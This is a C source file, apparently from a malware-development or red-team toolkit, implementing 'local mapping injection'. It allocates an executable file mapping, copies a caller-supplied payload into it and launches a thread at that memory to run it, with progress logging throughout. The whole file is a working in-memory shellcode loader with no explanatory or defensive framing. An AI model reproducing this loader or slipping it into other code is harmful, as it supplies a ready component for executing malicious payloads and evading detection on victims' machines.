#include "LocalMappingInjection.h"

BOOL LocalMappingInjection
(
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	BOOL	State			= TRUE;
	HANDLE	FileHandle		= NULL;
	HANDLE	ThreadHandle	= NULL;
	PVOID	LocalAddress	= NULL;

	if (!(FileHandle = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, PayloadSize, NULL)) || FileHandle == INVALID_HANDLE_VALUE)
	{
		WARN("Failed To Create a New File Mapping!");
		PRINT_ERROR("CreateFileMappingW");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] File Handle", FileHandle);

	if (!(LocalAddress = MapViewOfFile(FileHandle, (FILE_MAP_WRITE | FILE_MAP_EXECUTE), 0, 0, PayloadSize)) || LocalAddress == NULL)
	{
		WARN("Failed To Map Payload to File!");
		PRINT_ERROR("MapViewOfFile");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Mapped %zu Bytes to Local Address", PayloadSize);

	RtlCopyMemory(LocalAddress, Payload, PayloadSize);

	INFO("Copied Payload into Local Address");

	if (!(ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LocalAddress, NULL, 0, NULL)) || ThreadHandle == NULL)
	{
		WARN("Failed To Create Thread Pointing to Our Payload!");
		PRINT_ERROR("ThreadHandle");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Thread Handle", ThreadHandle);
	INFO("Thread Pointing to Our Payload");

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle != NULL)
		CloseHandle(ThreadHandle);

	if (LocalAddress != NULL)
		UnmapViewOfFile((LPCVOID)LocalAddress);

	return State;

}